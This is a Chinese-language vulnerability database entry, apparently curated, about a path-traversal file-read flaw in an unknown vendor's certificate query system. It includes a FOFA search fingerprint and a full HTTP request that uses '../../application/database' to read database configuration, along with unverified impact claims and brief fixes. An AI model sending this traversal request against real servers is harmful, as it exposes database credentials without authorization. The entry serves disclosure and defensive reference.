---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "证书查询系统（厂商未知） ajax/lang路径遍历配置读取"
product: "证书查询系统（厂商未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，语言加载及后缀规则未知"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F/%E8%AF%81%E4%B9%A6%E7%B3%BB%E7%BB%9F%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9Flang%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
previous_fofa_unverified: "/index/js/jquery.uls.data.js"
id: "vw-066f2563de103b286eaca613"
entity_id: "ve-066f2563de103b286eaca613"
schema_version: "1"
fofa: "\"/index/js/jquery.uls.data.js\""
---

# 证书查询系统（厂商未知） ajax/lang路径遍历配置读取

## 条目说明

- 对象与具体问题：证书查询系统（厂商未知）；ajax/lang路径遍历配置读取
- 版本、配置及部署条件：版本未知，语言加载及后缀规则未知
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同544复现入口，545加截图但无可读返回，合并时保留源映射
- 标题证书系统查询系统重复，系统控制是二阶影响未由读取示例证明
- 需核读取范围/返回语义；无补丁或在野依据，HTTP无围栏

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

证书系统查询系统lang任意文件读取漏洞，可读取数据库配置文件导致数据泄露，系统被控制，危害极大。

## 影响版本

证书系统查询系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA："/index/js/jquery.uls.data.js"

POC/EXP：

```http
GET /index/ajax/lang?lang=../../application/database HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
```


![image-20241105224411060](./.resource/证书系统查询系统lang任意文件读取漏洞/media/image-20241105224411060.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
